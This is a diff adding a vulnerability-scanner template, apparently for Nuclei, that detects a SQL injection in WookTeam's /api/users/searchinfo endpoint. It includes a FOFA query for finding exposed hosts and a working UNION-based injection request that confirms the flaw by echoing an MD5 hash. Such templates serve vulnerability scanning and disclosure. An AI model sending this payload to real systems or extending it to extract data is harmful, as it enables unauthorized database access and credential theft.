@@ -1,0 +1,35 @@
+id: WookTeam-searchinfo-sql
+
+info:
+  name: "WookTeam searchinfo 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="Wookteam"
+      WookTeam系统在/api/users/searchinfo接口中存在SQL注入缺陷，攻击者可通过构造恶意SQL语句实现数据库敏感信息提取（如管理员凭证、用户隐私数据等）。在具备高权限条件下，该漏洞可能被进一步利用执行服务器端命令写入操作，最终达成对目标系统的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486406&idx=1&sn=c36ed1d4291668636f78de9ac24f9557&chksm=c267bef5f51037e3858cce2217b97dd1adbf6d2b52f6e65636bf4c37f9134d8b402a7d3c8954&token=1628549949&lang=zh_CN#rd
+  tags: WookTeam
+
+
+http:
+- raw:
+  - |
+    GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2CMD5%28123456%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883e'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
